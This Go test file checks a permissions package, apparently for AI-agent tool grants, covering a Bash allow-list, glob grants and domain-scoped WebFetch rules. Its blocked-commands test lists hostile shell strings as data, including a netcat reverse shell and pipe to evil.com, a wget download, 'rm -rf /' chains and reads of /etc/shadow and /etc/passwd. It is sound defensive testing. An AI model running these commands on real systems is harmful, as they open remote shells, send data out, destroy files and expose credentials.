package permissions_test

import (
	"testing"

	"github.com/lx-wnk/kontor/server/internal/permissions"
)

// ---------------------------------------------------------------------------
// F-SEC-007 — Bash allow-list (IsSafeBashPattern)
// ---------------------------------------------------------------------------

// TestIsSafeBashPattern_AllowedCommands verifies that known-safe commands pass.
func TestIsSafeBashPattern_AllowedCommands(t *testing.T) {
	allowed := []string{
		"pnpm test",
		"pnpm test:watch",
		"pnpm lint",
		"npm run build",
		"git status",
		"git commit -m 'msg'",
		"go build ./...",
		"go test ./... -race",
		"cargo test",
		"python3 -m pytest",
		"python script.py",
		"ls -la",
		"cat README.md",
		"grep -r pattern .",
		"find . -name '*.go'",
		"mkdir -p dist",
		"touch .gitkeep",
		"cp src dst",
		"mv old new",
		"echo hello",
		"pwd",
		"make test",
		"task build",
		"golangci-lint run ./...",
		"gofmt -w .",
		"docker build .",
		"jq '.key' file.json",
	}
	for _, pat := range allowed {
		ok, reason := permissions.IsSafeBashPattern(pat)
		if !ok {
			t.Errorf("IsSafeBashPattern(%q) = false (%s), want true", pat, reason)
		}
	}
}

// TestIsSafeBashPattern_BlockedCommands_PoC verifies that dangerous patterns
// are rejected.  These represent the specific bypasses identified in F-SEC-007.
func TestIsSafeBashPattern_BlockedCommands_PoC(t *testing.T) {
	blocked := []struct {
		pattern string
		desc    string
	}{
		// F-SEC-007 PoC: sudo
		{"sudo cat /etc/shadow", "sudo + sensitive path"},
		{"sudo -u root bash", "sudo with user flag"},

		// F-SEC-007 PoC: path-prefixed xargs bypass
		{"/usr/bin/xargs sh -c id", "path-prefixed xargs"},
		{"xargs sh", "bare xargs"},

		// F-SEC-007 PoC: eval
		{"eval 'x'", "eval"},

		// F-SEC-007 PoC: pypy bypass (not in safe list)
		{"pypy3 -c 'print(1)'", "pypy3 interpreter — not in safe allow-list"},
		{"pypy -c 'print(1)'", "pypy interpreter — not in safe allow-list"},

		// Command substitution
		{"echo $(cat /etc/passwd)", "command substitution"},
		{"ls `id`", "backtick substitution"},

		// Chained commands
		{"git status; rm -rf /", "semicolon chain"},
		{"pnpm test && curl http://evil.com", "AND chain with curl"},
		{"go build | nc evil.com 4444", "pipe to netcat"},

		// Hex escape
		{"echo \\x2f\\x65\\x74\\x63", "hex escape sequence"},

		// Absolute path to unknown binary
		{"/usr/local/bin/somemalware", "unknown binary via absolute path"},

		// curl / wget / nc / netcat (explicitly blocked)
		{"curl https://evil.com", "curl"},
		{"wget https://evil.com -O /tmp/x", "wget"},
		{"nc -e /bin/sh evil.com 4444", "netcat"},

		// shell -c patterns
		{"sh -c 'id'", "sh -c"},
		{"bash -c 'rm -rf /'", "bash -c"},

		// Blank pattern
		{"", "empty pattern"},
		{"   ", "whitespace-only pattern"},
	}
	for _, tc := range blocked {
		ok, reason := permissions.IsSafeBashPattern(tc.pattern)
		if ok {
			t.Errorf("IsSafeBashPattern(%q) [%s] = true, want false", tc.pattern, tc.desc)
		} else {
			t.Logf("IsSafeBashPattern(%q) correctly blocked: %s", tc.pattern, reason)
		}
	}
}

// ---------------------------------------------------------------------------
// Bug 2 — cmd* glob patterns (IsSafeBashPattern + ValidateGrantEntry)
// ---------------------------------------------------------------------------

// TestIsSafeBashPattern_GlobSuffix verifies that a safe command followed by
// a trailing glob wildcard (no space) is accepted.
func TestIsSafeBashPattern_GlobSuffix(t *testing.T) {
	cases := []string{
		"grep*",
		"ls*",
		"cat*",
		"pnpm install*",
		"git add*",
		"git commit*",
		"du*",
		"gzip*",
	}
	for _, pat := range cases {
		ok, reason := permissions.IsSafeBashPattern(pat)
		if !ok {
			t.Errorf("IsSafeBashPattern(%q) = false (%s), want true", pat, reason)
		}
	}
}

// TestIsSafeBashPattern_GlobSuffix_UnknownCommand verifies that an unknown
// command with a trailing glob is still rejected.
func TestIsSafeBashPattern_GlobSuffix_UnknownCommand(t *testing.T) {
	ok, reason := permissions.IsSafeBashPattern("pypy*")
	if ok {
		t.Errorf("IsSafeBashPattern(%q) = true, want false", "pypy*")
	} else {
		t.Logf("IsSafeBashPattern(%q) correctly blocked: %s", "pypy*", reason)
	}
}

// TestIsSafeBashPattern_GlobSuffix_ExplicitlyBlocked verifies that a command
// that is explicitly blocked in the map is still blocked when a glob is appended.
func TestIsSafeBashPattern_GlobSuffix_ExplicitlyBlocked(t *testing.T) {
	ok, reason := permissions.IsSafeBashPattern("curl*")
	if ok {
		t.Errorf("IsSafeBashPattern(%q) = true, want false", "curl*")
	} else {
		t.Logf("IsSafeBashPattern(%q) correctly blocked: %s", "curl*", reason)
	}
}

// TestValidateGrantEntry_BashGlobPattern verifies that ValidateGrantEntry
// accepts a Bash grant with a cmd* glob pattern after Bug 2 is fixed.
func TestValidateGrantEntry_BashGlobPattern(t *testing.T) {
	if err := permissions.ValidateGrantEntry("Bash", "grep*"); err != nil {
		t.Errorf("ValidateGrantEntry(\"Bash\", \"grep*\") = %v, want nil", err)
	}
}

// ---------------------------------------------------------------------------
// F-SEC-004 — WebFetch pattern enforcement (ValidateWebFetchPattern)
// ---------------------------------------------------------------------------

// TestValidateWebFetchPattern_RequiresNonEmptyPattern verifies that a nil or
// empty pattern is rejected.
func TestValidateWebFetchPattern_RequiresNonEmptyPattern(t *testing.T) {
	cases := []struct {
		name    string
		pattern *string
	}{
		{"nil pattern", nil},
		{"empty string", strPtr("")},
		{"whitespace only", strPtr("   ")},
	}
	for _, tc := range cases {
		if err := permissions.ValidateWebFetchPattern(tc.pattern); err == nil {
			t.Errorf("ValidateWebFetchPattern(%v) [%s] = nil, want %v", tc.pattern, tc.name, permissions.ErrWebFetchPatternRequired)
		}
	}
}

// TestValidateWebFetchPattern_AcceptsNonEmptyPattern verifies that a
// non-empty pattern is accepted.
func TestValidateWebFetchPattern_AcceptsNonEmptyPattern(t *testing.T) {
	cases := []string{
		"https://docs.example.com*",
		"https://api.github.com/repos/*",
		"*.example.com",
		"https://registry.npmjs.org/*",
	}
	for _, pat := range cases {
		p := pat
		if err := permissions.ValidateWebFetchPattern(&p); err != nil {
			t.Errorf("ValidateWebFetchPattern(%q) = %v, want nil", pat, err)
		}
	}
}

// ---------------------------------------------------------------------------
// F-SEC-004 — Templates must not include blanket WebFetch
// ---------------------------------------------------------------------------

// TestTemplateTools_NoUnconstrainedWebFetch verifies that no template includes
// WebFetch as a bare tool name (without an associated domain pattern).
// Since TemplateTools maps template names to tool name slices — not to
// (tool, pattern) pairs — any "WebFetch" entry in a template is by definition
// unconstrained and must not appear.
func TestTemplateTools_NoUnconstrainedWebFetch(t *testing.T) {
	for tmplName, tools := range permissions.TemplateTools {
		for _, tool := range tools {
			if tool == "WebFetch" {
				t.Errorf(
					"template %q contains bare \"WebFetch\" — blanket WebFetch grants are forbidden (F-SEC-004); "+
						"agents must request an explicit domain-scoped WebFetch grant",
					tmplName,
				)
			}
		}
	}
}

// TestTemplateTools_ResolveTemplate_DoesNotReturnWebFetch ensures that
// ResolveTemplate never returns WebFetch in the tool list for any template.
func TestTemplateTools_ResolveTemplate_DoesNotReturnWebFetch(t *testing.T) {
	for tmplName := range permissions.TemplateTools {
		tools, err := permissions.ResolveTemplate(tmplName)
		if err != nil {
			t.Fatalf("ResolveTemplate(%q) returned unexpected error: %v", tmplName, err)
		}
		for _, tool := range tools {
			if tool == "WebFetch" {
				t.Errorf("ResolveTemplate(%q) returned WebFetch — must be removed from template (F-SEC-004)", tmplName)
			}
		}
	}
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

func strPtr(s string) *string { return &s }
